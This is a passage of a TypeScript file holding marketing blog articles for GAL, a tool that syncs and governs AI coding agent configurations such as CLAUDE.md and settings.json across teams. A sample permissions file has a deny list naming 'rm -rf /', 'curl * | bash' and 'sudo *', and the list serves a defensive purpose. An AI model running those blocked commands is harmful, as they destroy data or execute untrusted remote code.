- Always run \`pnpm check\` (lint + type-check) before considering work done.`}</code>
            </pre>
            <p>
              <strong>
                .claude/settings.json — permissions and tool configuration
              </strong>
            </p>
            <p>
              This file controls which tools Claude Code can use and what
              commands it is allowed to run. Sharing a consistent{" "}
              <code>settings.json</code> means every developer's agent has the
              same guardrails:
            </p>
            <pre>
              <code>{`{
  "permissions": {
    "allow": [
      "Bash(git *)",
      "Bash(pnpm *)",
      "Bash(make *)",
      "Bash(npx vitest *)"
    ],
    "deny": [
      "Bash(rm -rf /)",
      "Bash(curl * | bash)",
      "Bash(sudo *)"
    ]
  }
}`}</code>
            </pre>
            <p>
              <strong>
                .claude/commands/*.md — custom slash commands
              </strong>
            </p>
            <p>
              These are team-specific workflows encoded as slash commands. When
              shared, every developer gets the same <code>/review</code>,{" "}
              <code>/deploy</code>, or <code>/test</code> commands:
            </p>
            <pre>
              <code>{`# .claude/commands/review.md
Review the current diff against our coding standards.
Check for:
1. TypeScript strict compliance (no any, no ts-ignore)
2. Test coverage for new functions
3. No hardcoded secrets or API keys
4. Proper error handling (no silent catches)
Output a summary with pass/fail for each check.`}</code>
            </pre>
            <p>
              <strong>
                .claude/agents/*.md — specialized agent definitions
              </strong>
            </p>
            <p>
              Agent files define specialized personas that developers can invoke
              for specific tasks. A shared set ensures the whole team has access
              to the same expert agents:
            </p>
            <pre>
              <code>{`# .claude/agents/qa-engineer.md
You are a QA engineer specializing in E2E testing with Playwright.
When given a feature, write comprehensive test scenarios covering:
- Happy path
- Edge cases and error states
- Mobile and desktop viewports
- Accessibility (keyboard navigation, screen readers)
Always use the Page Object pattern and data-testid selectors.`}</code>
            </pre>
            <p>
              <strong>.mcp.json — MCP server configuration</strong>
            </p>
            <p>
              MCP (Model Context Protocol) servers extend Claude Code with
              external tools. A shared <code>.mcp.json</code> ensures every
              developer has access to the same integrations:
            </p>
            <pre>
              <code>{`{
  "mcpServers": {
    "sentry": {
      "command": "npx",
      "args": ["-y", "@sentry/mcp-server"],
      "env": {
        "SENTRY_AUTH_TOKEN": "env:SENTRY_AUTH_TOKEN"
      }
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"]
    }
  }
}`}</code>
            </pre>
            <p>
              <strong>.claude/rules/*.md — context-specific rules</strong>
            </p>
            <p>
              Rules files auto-load based on file paths. For example, a rule for
              API development only loads when editing files in{" "}
              <code>apps/api/</code>. These are powerful for large codebases
              where a single <code>CLAUDE.md</code> would become unwieldy.
            </p>
            <p>
              Now that you know what needs to be shared, here are three
              approaches, from simplest to most robust.
            </p>
          </>
        ),
      },
      {
        id: "approach-1-git-repo",
        heading: "Approach 1: Shared Git repository",
        content: (
          <>
            <p>
              The most straightforward way to share Claude Code settings across
              your team is to commit the configuration files directly to your
              project repository. Every developer who clones the repo gets the
              same <code>CLAUDE.md</code>, the same{" "}
              <code>.claude/settings.json</code>, and the same custom commands.
            </p>
            <pre>
              <code>{`# Typical repo structure with shared Claude Code config
my-project/
├── CLAUDE.md                    # Shared project instructions
├── .claude/
│   ├── settings.json            # Shared tool permissions
│   ├── commands/
│   │   ├── review.md            # Team code review command
│   │   ├── test.md              # Team testing command
│   │   └── deploy-checklist.md  # Deployment checklist command
│   ├── agents/
│   │   ├── qa-engineer.md       # QA specialist agent
│   │   └── security-reviewer.md # Security review agent
│   └── rules/
│       ├── api-development.md   # Rules for API files
│       └── e2e-testing.md       # Rules for test files
├── .mcp.json                    # Shared MCP server config
└── src/
    └── ...`}</code>
            </pre>
            <p>
              Updates go through your normal pull request workflow. When someone
              improves the <code>CLAUDE.md</code> or adds a new custom command,
              they open a PR, the team reviews it, and everyone gets the update
              on their next <code>git pull</code>.
            </p>
            <p>
              For organizations with multiple repositories, you can create a
              dedicated <code>engineering-standards</code> repo and symlink from
              each project:
            </p>
            <pre>
              <code>{`# Symlink org CLAUDE.md into each project
ln -s ~/org/engineering-standards/CLAUDE.md ~/projects/api/CLAUDE.md
ln -s ~/org/engineering-standards/CLAUDE.md ~/projects/frontend/CLAUDE.md`}</code>
            </pre>
            <p>
              <strong>Pros:</strong> Simple, version-controlled, works with your
              existing PR workflow, zero new tooling.
            </p>
            <p>
              <strong>Cons:</strong> Does not scale across many repos. Symlinks
              are fragile and require manual setup. No way to push updates to
              developers — they must pull. Merge conflicts in{" "}
              <code>CLAUDE.md</code> when multiple people edit it. No visibility
              into who is actually using the config.
            </p>
          </>
        ),
      },
      {
        id: "approach-2-dotfiles",
        heading: "Approach 2: Dotfiles and home directory configs",
        content: (
          <>
            <p>
              Many engineering teams already use dotfiles repositories to share
              shell configs, editor settings, and development tooling. The same
              pattern works for sharing Claude Code configuration at the user
              level.
            </p>
            <p>
              Claude Code reads configuration from two locations: the project
              directory and the user's home directory at{" "}
              <code>~/.claude/</code>. A dotfiles setup can populate the home
              directory with organization defaults while leaving project-level
              configs for per-repo customization.
            </p>
            <pre>
              <code>{`# Team dotfiles repo structure
team-dotfiles/
├── claude/
│   ├── CLAUDE.md              # Org-wide agent instructions
│   ├── settings.json          # Default tool permissions
│   ├── commands/
│   │   ├── review.md          # Standard code review
│   │   ├── commit.md          # Commit message generator
│   │   └── onboard.md         # Onboarding helper
│   └── agents/
│       ├── architect.md       # Architecture review agent
│       └── docs-writer.md     # Documentation agent
├── install.sh                 # Symlinks everything to ~/.claude/
└── README.md

# install.sh
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
mkdir -p ~/.claude/commands ~/.claude/agents

# Symlink settings
ln -sf "$SCRIPT_DIR/claude/settings.json" ~/.claude/settings.json

# Symlink commands
for cmd in "$SCRIPT_DIR"/claude/commands/*.md; do
  ln -sf "$cmd" ~/.claude/commands/
done

# Symlink agents
for agent in "$SCRIPT_DIR"/claude/agents/*.md; do
  ln -sf "$agent" ~/.claude/agents/
done

echo "Claude Code team config installed."`}</code>
            </pre>
            <p>
              Developers clone the dotfiles repo once, run the install script,
              and get the organization's baseline. They can layer personal
              customizations on top by adding their own files to{" "}
              <code>~/.claude/</code> — the team defaults serve as a starting
              point, not a straitjacket.
            </p>
            <p>
              To update the team config, a developer pushes changes to the
              dotfiles repo and notifies the team to{" "}
              <code>git pull && ./install.sh</code>.
            </p>
            <p>
              <strong>Pros:</strong> Familiar pattern for teams already using
              dotfiles. Supports personal customization on top of team defaults.
              Works across multiple projects without per-repo setup.
            </p>
            <p>
              <strong>Cons:</strong> No centralized management — updates require
              each developer to manually pull and reinstall. No enforcement;
              developers can ignore or override everything. No audit trail of
              who has which version. Does not handle per-platform configs
              (Cursor, Copilot, Gemini) without significant extra scripting.
            </p>
          </>
        ),
      },
      {
        id: "approach-3-gal",
        heading:
          "Approach 3: GAL — centralized config sync for teams at scale",
        content: (
          <>
            <p>
              GAL (Governance Agentic Layer) was built specifically to solve the
              problem of sharing and syncing Claude Code configuration across
              organizations. Instead of relying on git pulls, symlinks, or
              install scripts, GAL provides a centralized dashboard where an
              admin sets the approved configuration and a CLI that distributes
              it to every developer with a single command.
            </p>
            <p>
              The setup takes about two minutes:
            </p>
            <pre>
              <code>{`# Install the GAL CLI
npm install -g @gal-run/cli

# Authenticate with your GitHub account
gal auth login

# Pull the organization's approved Claude Code configuration
gal sync --pull

# That's it. Your local environment now has:
# - CLAUDE.md with org-approved instructions
# - .claude/settings.json with approved permissions
# - .claude/commands/*.md with team slash commands
# - .claude/agents/*.md with shared agent definitions
# - .mcp.json with approved MCP server configs`}</code>
            </pre>
            <p>
              When an admin updates the approved configuration in the GAL
              dashboard — adding a new custom command, tightening a permission,
              updating the project instructions — every developer gets it on
              their next <code>gal sync --pull</code>. No Slack messages, no
              manual copying, no merge conflicts.
            </p>
            <p>
              GAL also handles multi-platform configuration. The same approved
              config can be synced to Claude Code, Cursor, GitHub Copilot,
              Windsurf, Gemini Code Assist, and Codex from a single source of
              truth. If your organization uses multiple AI coding agents, you
              set the policy once and GAL translates it to each platform's
              configuration format.
            </p>
            <p>
              For enterprise teams, GAL adds an audit trail: you can see which
              developers have synced, when they last pulled the config, and
              which version they are running. This is the answer to your CISO's
              question about what your AI agents are configured to do.
            </p>
            <p>
              <strong>Pros:</strong> Centralized management from a dashboard.
              One-command sync for developers. Multi-platform support. Audit
              trail and version history. Scales to organizations of any size.
            </p>
            <p>
              <strong>Cons:</strong> Requires a GAL account (free tier
              available). Adds a tool to the workflow. Newer product compared to
              git-based approaches.
            </p>
          </>
        ),
      },
      {
        id: "comparison-table",
        heading: "Comparison: Git repo vs. dotfiles vs. GAL",
        content: (
          <>
            <p>
              Here is how the three approaches compare across the factors that
              matter most when sharing Claude Code configuration across a team:
            </p>
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b-2 border-gray-200">
                    <th className="py-3 pr-4 font-semibold">Factor</th>
                    <th className="py-3 pr-4 font-semibold">Git Repo</th>
                    <th className="py-3 pr-4 font-semibold">Dotfiles</th>
                    <th className="py-3 pr-4 font-semibold">GAL</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 pr-4 font-medium">Setup effort</td>
                    <td className="py-3 pr-4">Minimal</td>
                    <td className="py-3 pr-4">Low (install script)</td>
                    <td className="py-3 pr-4">Low (CLI install + login)</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 pr-4 font-medium">Push updates to team</td>
                    <td className="py-3 pr-4">No (pull only)</td>
                    <td className="py-3 pr-4">No (pull + reinstall)</td>
                    <td className="py-3 pr-4">Yes (gal sync --pull)</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 pr-4 font-medium">Multi-repo support</td>
                    <td className="py-3 pr-4">Manual symlinks</td>
                    <td className="py-3 pr-4">Yes (home dir)</td>
                    <td className="py-3 pr-4">Yes (org-wide sync)</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 pr-4 font-medium">Multi-platform</td>
                    <td className="py-3 pr-4">No</td>
                    <td className="py-3 pr-4">Manual scripting</td>
                    <td className="py-3 pr-4">Yes (6 platforms)</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 pr-4 font-medium">Audit trail</td>
                    <td className="py-3 pr-4">Git log only</td>
                    <td className="py-3 pr-4">None</td>
                    <td className="py-3 pr-4">Full (who synced, when, which version)</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 pr-4 font-medium">Enforcement</td>
                    <td className="py-3 pr-4">None</td>
                    <td className="py-3 pr-4">None</td>
                    <td className="py-3 pr-4">Available (policy layer)</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 pr-4 font-medium">Version control</td>
                    <td className="py-3 pr-4">Yes (git)</td>
                    <td className="py-3 pr-4">Yes (git)</td>
                    <td className="py-3 pr-4">Yes (dashboard + git)</td>
                  </tr>
                  <tr>
                    <td className="py-3 pr-4 font-medium">Best for team size</td>
                    <td className="py-3 pr-4">1-10</td>
                    <td className="py-3 pr-4">5-20</td>
                    <td className="py-3 pr-4">10+</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </>
        ),
      },
      {
        id: "when-to-use-which",
        heading: "When to use which approach",
        content: (
          <>
            <p>
              The right approach depends on your team size, how many
              repositories you manage, and whether you have compliance
              requirements around AI agent governance.
            </p>
            <p>
              <strong>Solo developer or team of 1-5:</strong> Commit your{" "}
              <code>CLAUDE.md</code> and <code>.claude/</code> directory
              directly to your repo. This is the simplest path and it works
              because you can coordinate updates over a quick standup or Slack
              message. Use your normal PR workflow to review changes to the
              config.
            </p>
            <p>
              <strong>Team of 5-15, single repo or small multi-repo:</strong>{" "}
              Use a combination of git repo configs and a dotfiles repository.
              Put project-specific context in each repo's <code>CLAUDE.md</code>
              . Put org-wide settings, commands, and agents in a shared dotfiles
              repo that every developer installs to{" "}
              <code>~/.claude/</code>. This gives you a baseline with room for
              per-project customization.
            </p>
            <p>
              <strong>Team of 10-20+ or enterprise with compliance needs:</strong>{" "}
              Use GAL. At this scale, the manual overhead of keeping dotfiles
              in sync breaks down. New hires forget to run the install script.
              Updates require chasing people on Slack. Your security team asks
              for proof that everyone is on the approved config. GAL solves all
              of this with centralized management and one-command sync. This is
              the Claude Code enterprise setup that scales with your
              organization.
            </p>
            <p>
              <strong>Hybrid approach:</strong> Many teams start with git and
              graduate to GAL as they grow. GAL can ingest your existing{" "}
              <code>CLAUDE.md</code> and <code>.claude/</code> configs, so the
              migration is straightforward — you are not starting over.
            </p>
          </>
        ),
      },
      {
        id: "what-to-put-in-config",
        heading: "Best practices for a shared Claude Code configuration",
        content: (
          <>
            <p>
              Regardless of which approach you use to sync CLAUDE.md and
              settings across your organization, here are the patterns that
              work well for teams:
            </p>
            <p>
              <strong>Keep CLAUDE.md focused on the "why" and "how"</strong>
            </p>
            <p>
              The best CLAUDE.md files are not exhaustive documentation. They
              tell Claude Code how the team works: what the architecture looks
              like, what testing framework to use, what code patterns to prefer,
              what commands to run before committing. Think of it as the
              instructions you would give a senior contractor on their first
              day.
            </p>
            <p>
              <strong>Use settings.json for security boundaries</strong>
            </p>
            <p>
              The permissions in <code>.claude/settings.json</code> are your
              first line of defense. At minimum, deny destructive commands
              like <code>rm -rf</code>, piped <code>curl</code> execution, and{" "}
              <code>sudo</code>. Allow the specific tools your team uses:{" "}
              <code>git</code>, your package manager, your build system.
            </p>
            <p>
              <strong>Encode team workflows as custom commands</strong>
            </p>
            <p>
              If your team has a standard code review checklist, a PR creation
              workflow, or a deployment process, encode it as a{" "}
              <code>.claude/commands/</code> file. This turns tribal knowledge
              into repeatable, consistent workflows that every developer can
              invoke with a slash command.
            </p>
            <p>
              <strong>Build specialized agents for common tasks</strong>
            </p>
            <p>
              Agent definitions in <code>.claude/agents/</code> let you create
              expert personas for specific work: a QA engineer for test writing,
              a security reviewer for code audits, an architect for design
              reviews. Sharing these across the team means everyone has access
              to the same specialized capabilities.
            </p>
            <p>
              <strong>Use rules for large codebases</strong>
            </p>
            <p>
              If your <code>CLAUDE.md</code> is getting long, split
              context-specific instructions into <code>.claude/rules/</code>{" "}
              files. These auto-load based on file paths, so Claude Code only
              sees the API development rules when editing API files, and only
              sees E2E testing rules when working on tests. This keeps context
              focused and reduces token usage.
            </p>
          </>
        ),
      },
      {
        id: "enforcement-vs-sync",
        heading: "Sync vs. enforcement: knowing when you need each",
        content: (
          <>
            <p>
              Syncing Claude Code configuration across your team and enforcing
              it are different things. It is worth understanding the distinction
              before choosing your approach.
            </p>
            <p>
              <strong>Sync</strong> distributes the approved config. Developers
              get the right settings, commands, and instructions. But they can
              still override them locally — add their own permissions, modify
              the CLAUDE.md, skip the sync.
            </p>
            <p>
              <strong>Enforcement</strong> ensures the config cannot be
              overridden. The agent's permissions are locked to what the admin
              approved. Attempts to run denied commands are blocked at runtime,
              not just absent from the settings file.
            </p>
            <p>
              For most engineering teams, sync is enough. The friction of
              deviating from the team config is high enough that developers
              follow it naturally. The 80/20 rule applies: config sync solves
              80% of the consistency problem with minimal developer friction.
            </p>
            <p>
              Enforcement becomes necessary for teams with strict compliance
              requirements — SOC 2, ISO 27001, financial services, healthcare.
              If your auditors need proof that AI agents cannot exceed their
              approved scope, sync alone is not sufficient.
            </p>
            <p>
              The practical path: start with sync. Build the habit across
              your team. Layer enforcement on top when compliance demands it.
              GAL supports both — sync today, enforcement when you are ready.
            </p>
          </>
        ),
      },
      {
        id: "getting-started",
        heading: "Getting started with shared Claude Code configuration",
        content: (
          <>
            <p>
              Here is the fastest path to sharing Claude Code configuration
              across your engineering team, based on where you are today:
            </p>
            <p>
              <strong>If you have not started sharing configs at all:</strong>{" "}
              Commit your best developer's <code>CLAUDE.md</code> and{" "}
              <code>.claude/</code> directory to your main repository today.
              Even this minimal step ensures every developer who clones the repo
              gets a working baseline. You can iterate from there.
            </p>
            <p>
              <strong>If you are already using a git repo or dotfiles:</strong>{" "}
              Evaluate whether the manual overhead is sustainable. If developers
              are consistently out of date, or if your security team is asking
              for audit trails, it is time to look at a centralized solution.
            </p>
            <p>
              <strong>If you want centralized management now:</strong> Start at{" "}
              <a href="https://gal.run">gal.run</a>. The setup is fast:
            </p>
            <ol>
              <li>
                Install the CLI: <code>npm install -g @gal-run/cli</code>
              </li>
              <li>
                Authenticate: <code>gal auth login</code>
              </li>
              <li>
                Connect your GitHub organization
              </li>
              <li>
                Upload your approved configuration via the dashboard
              </li>
              <li>
                Tell your team to run: <code>gal sync --pull</code>
              </li>
            </ol>
            <p>
              From that point on, any update to the approved config is one{" "}
              <code>gal sync --pull</code> away for every developer on the
              team. No Slack messages, no install scripts, no wondering whether
              everyone is on the same page.
            </p>
            <p>
              The organizations that get AI agent governance right early will
              move faster with more confidence as agents become more capable.
              Whether you start with a git repo, dotfiles, or GAL, the
              important thing is to start. Pick the approach that matches your
              team today, and upgrade when you outgrow it.
            </p>
          </>
        ),
      },
    ],
  },
  {
    slug: "introducing-gal",
    title: "Introducing GAL",
    subtitle:
      "Your CISO can sleep at night while developers use AI coding agents.",
    date: "Mar 7, 2026",
    isoDate: "2026-03-07",
    category: "Product",
    categorySlug: "product",
    author: "GAL Team",
    readingTime: "9 min read",
    gradient: "linear-gradient(135deg, #0A0A0B 0%, #1a2a1a 50%, #00FF2A 100%)",
    sections: [
      {
        id: "the-problem",
        heading: "The problem: AI agents without guardrails",
        content: (
          <>
            <p>
              Every engineering team is adopting AI coding agents. Claude Code,
              Cursor, GitHub Copilot, Windsurf, Gemini Code Assist — the list
              grows every month. Developers love them because they ship faster.
              CISOs lose sleep because they have zero visibility into what these
              agents are configured to do.
            </p>
            <p>
              Today, AI agent configurations are scattered across hundreds of
              repositories. Each developer sets up their own{" "}
              <code>CLAUDE.md</code>, their own <code>.cursorrules</code>, their
              own permissions. There is no central place to see what agents are
              running, what they are allowed to do, or whether they comply with
              your organization&apos;s security policies.
            </p>
            <p>
              This is the ungoverned chaos that every security-conscious
              organization faces. And it will only get worse as agents become
              more capable and more autonomous.
            </p>
          </>
        ),
      },
      {
        id: "our-approach",
        heading: "Our approach: Discovery, Approval, Sync",
        content: (
          <>
            <p>
              GAL is the governance layer for AI coding agents. We built it
              around a simple three-step workflow that brings order without
              slowing developers down.
            </p>
            <ul>
              <li>
                <strong>Discovery</strong> — GAL automatically scans every
                repository in your organization and finds AI agent
                configurations. Claude Code, Cursor, Copilot, Windsurf, Gemini,
                Codex — we detect them all. One dashboard shows you everything.
              </li>
              <li>
                <strong>Approval</strong> — Your CISO or security admin sets the
                organization-wide approved configuration. Define what
                permissions agents should have, what tools they can use, what
                commands are allowed. One source of truth for the entire org.
              </li>
              <li>
                <strong>Sync</strong> — Developers pull the approved
                configuration with a single command:{" "}
                <code>gal sync --pull</code>. No manual copying, no
                configuration drift, no compliance gaps. Agents across your
                entire organization run with the configuration your security
                team approved.
              </li>
            </ul>
          </>
        ),
      },
      {
        id: "how-it-works",
        heading: "How it works",
        content: (
          <>
            <p>
              Getting started with GAL takes less than two minutes. Install the
              CLI, authenticate with GitHub, and run your first sync.
            </p>
            <p>
              Behind the scenes, GAL connects to your GitHub organization via a
              GitHub App. It scans repositories for known AI agent configuration
              files — <code>CLAUDE.md</code>, <code>.claude/settings.json</code>
              , <code>.cursorrules</code>, <code>.github/copilot</code>, and
              more. The results appear in your dashboard instantly.
            </p>
            <p>
              From the dashboard, an administrator sets the approved
              configuration. This is a versioned, auditable configuration that
              defines exactly how AI agents should behave in your organization.
              When a developer runs <code>gal sync --pull</code>, they get the
              latest approved configuration applied to their local environment.
            </p>
            <p>
              No more configuration drift. No more &quot;it works on my
              machine&quot; for agent setups. Every developer, every repository,
              every agent — running the same approved configuration.
            </p>
          </>
        ),
      },
      {
        id: "security-first",
        heading: "Built for security teams",
        content: (
          <>
            <p>
              We built GAL because we believe AI coding agents will become the
              most important tools in software development. And like every
              important tool, they need governance.
            </p>
            <p>
              GAL gives security teams what they have been asking for: visibility
              into what agents are doing, control over what they are allowed to
              do, and confidence that the entire organization is running on
              approved configurations.
            </p>
            <p>
              We are not slowing developers down. We are giving them a faster
              path to compliance. Instead of manually configuring each agent,
              they run one command and get the approved setup. Instead of
              wondering if their configuration is correct, they know it is.
            </p>
            <p>
              This is also what makes GAL defensible. We are the only platform
              that governs all six major AI coding agents — Claude Code, Cursor,
              Copilot, Windsurf, Gemini, and Codex — from a single approved
              configuration. Every organization that standardizes on GAL embeds
              its security policies into how agents are set up, not bolted on
              afterward. That institutional context, combined with compliance
              relationships built during design partner deployments, is not
              something a new entrant can replicate quickly.
            </p>
          </>
        ),
      },
      {
        id: "beyond-configuration",
        heading: "Where we are going",
        content: (
          <>
            <p>
              Configuration sync is what we ship today. It solves an immediate
              and urgent problem. But the reason we built GAL the way we did —
              as a governance layer rather than a sync utility — is because
              configuration is only the beginning.
            </p>
            <p>
              The full vision is a governance stack that covers four layers
              organizations will need as AI agents become more autonomous:
            </p>
            <ul>
              <li>
                <strong>Runtime enforcement</strong> — policies enforced at
                execution time, not just at setup. Agents that attempt actions
                outside their approved scope are stopped before they run.
              </li>
              <li>
                <strong>Identity management</strong> — every agent action tied
                to the developer running it, integrated with your existing SSO
                and identity providers.
              </li>
              <li>
                <strong>Audit trails</strong> — a complete, searchable log of
                agent activity across your organization, exportable for
                compliance audits and SIEM integration.
              </li>
              <li>
                <strong>Policy engine</strong> — governance rules written in
                plain language and enforced automatically, across every agent
                and every platform.
              </li>
            </ul>
            <p>
              None of this works without getting configuration right first.
              That is why we are starting here, with design partners, building
              the foundation before adding the layers above it.
            </p>
          </>
        ),
      },
      {
        id: "whats-next",
        heading: "What's next",
        content: (
          <>
            <p>
              We are shipping GAL to design partners today. If you lead an
              engineering team that uses AI coding agents and cares about
              governance, we would love to work with you.
            </p>
            <p>
              Our roadmap for the next six months is focused on three
              milestones. First, runtime policy enforcement at the CLI
              execution layer — agents that attempt blocked actions are stopped
              before they run, not flagged after. Second,
              identity-aware governance with SSO and SAML integration, so
              every agent action maps to a real person in your directory.
              Third, compliance-grade audit trails with SIEM export, giving
              your security team the evidence they need for SOC 2 and ISO
              27001.
            </p>
            <p>
              The governance layer for AI agents is not a nice-to-have. As
              agents become more autonomous — running in the background,
              opening pull requests, triggering pipelines — the organizations
              that govern them well will move faster and with more confidence
              than those that do not. GAL is built to be that layer.
            </p>
            {/* TODO: Embed product demo videos here once available */}
          </>
        ),
      },
    ],
  },
  {
    slug: "multi-platform-discovery",
    title: "GAL now discovers configs across 6 AI coding platforms",
    subtitle:
      "Auto-discovery for Claude Code, Cursor, Copilot, Windsurf, Gemini, and Codex configurations.",
    date: "Mar 5, 2026",
    isoDate: "2026-03-05",
    category: "Product",
    categorySlug: "product",
    author: "GAL Team",
    readingTime: "3 min read",
    gradient: "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)",
    sections: [
      {
        id: "six-platforms",
        heading: "One scan, six platforms",
        content: (
          <>
            <p>
              When we launched GAL, we started with Claude Code discovery. Today,
              we are expanding to cover every major AI coding platform: Cursor,
              GitHub Copilot, Windsurf, Gemini Code Assist, and OpenAI Codex.
            </p>
            <p>
              A single scan of your GitHub organization now finds configuration
              files for all six platforms. You see everything in one dashboard —
              which repos have which agents configured, what permissions are set,
              and where the gaps are.
            </p>
          </>
        ),
      },
      {
        id: "why-multi-platform",
        heading: "Why multi-platform matters",
        content: (
          <>
            <p>
              Most engineering teams do not standardize on a single AI coding
              tool. Different developers prefer different tools. Some teams use
              Cursor for its IDE integration, others prefer Claude Code for its
              terminal workflow, and others use Copilot because it is already in
              their GitHub subscription.
            </p>
            <p>
              Governance cannot be platform-specific. If you only govern one
              agent, developers using other agents remain ungoverned. GAL solves
              this by treating all AI coding agents as first-class citizens.
            </p>
          </>
        ),
      },
    ],
  },
  {
    slug: "background-agents-governance",
    title: "Governing background agents at scale",
    subtitle:
      "How GAL brings visibility and control to autonomous coding agents running in the cloud.",
    date: "Mar 1, 2026",
    isoDate: "2026-03-01",
    category: "Engineering",
    categorySlug: "engineering",
    author: "GAL Team",
    readingTime: "5 min read",
    gradient: "linear-gradient(135deg, #2d1b69 0%, #6b21a8 50%, #a855f7 100%)",
    sections: [
      {
        id: "background-agents",
        heading: "The rise of background agents",
        content: (
          <>
            <p>
              Background agents — AI coding agents that run autonomously in the
              cloud — are the next frontier. They can work on issues, fix bugs,
              and create pull requests without a developer actively supervising
              them.
            </p>
            <p>
              This is incredibly powerful, and incredibly risky without proper
              governance. A misconfigured background agent can make unauthorized
              changes, access sensitive files, or consume expensive API credits
              without anyone noticing.
            </p>
          </>
        ),
      },
      {
        id: "gal-background-governance",
        heading: "GAL for background agents",
        content: (
          <>
            <p>
              GAL now supports governance for background agent sessions. Every
              background agent that runs through GAL inherits the
              organization&apos;s approved configuration. Session activity is
              logged, tool usage is tracked, and administrators can see exactly
              what each agent is doing in real time.
            </p>
            <p>
              We are building the control plane for autonomous coding. As agents
              become more capable, the governance layer becomes more critical.
              GAL ensures that capability and control scale together.
            </p>
          </>
        ),
      },
    ],
  },
  {
    slug: "why-we-built-gal",
    title: "Why we built GAL",
    subtitle:
      "The story behind the Governance Agentic Layer and why every organization needs one.",
    date: "Feb 20, 2026",
    isoDate: "2026-02-20",
    category: "Company",
    categorySlug: "company",
    author: "GAL Team",
    readingTime: "4 min read",
    gradient: "linear-gradient(135deg, #064e3b 0%, #065f46 50%, #10b981 100%)",
    sections: [
      {
        id: "origin-story",
        heading: "From internal tool to product",
        content: (
          <>
            <p>
              GAL started as an internal tool at Scheduler Systems. We were
              heavy users of AI coding agents across our team, and we kept
              running into the same problem: every developer had a different
              agent setup, and there was no way to ensure consistency or
              compliance.
            </p>
            <p>
              We built a simple tool to scan our repos and sync configurations.
              It worked so well that we realized every organization using AI
              agents would face the same challenge. That is when GAL became a
              product.
            </p>
          </>
        ),
      },
      {
        id: "governance-moat",
        heading: "Governance is the moat",
        content: (
          <>
            <p>
              Everyone is building better AI coding agents. Nobody is building
              governance for them. We believe that as agents become more
              powerful, the organizations that can deploy them safely will move
              faster than those that cannot.
            </p>
            <p>
              GAL is not about limiting what agents can do. It is about giving
              organizations the confidence to let agents do more. When you know
              that every agent in your org is running on an approved
              configuration, you can enable more powerful capabilities, grant
              more permissions, and trust agents with more autonomy.
            </p>
          </>
        ),
      },
    ],
  },
];

export function getArticleBySlug(slug: string): Article | undefined {
  return articles.find((a) => a.slug === slug);
}

export function getRelatedArticles(
  currentSlug: string,
  count: number = 3
): Article[] {
  return articles.filter((a) => a.slug !== currentSlug).slice(0, count);
}

export function getArticlesByCategory(categorySlug: string): Article[] {
  if (categorySlug === "all") return articles;
  return articles.filter((a) => a.categorySlug === categorySlug);
}
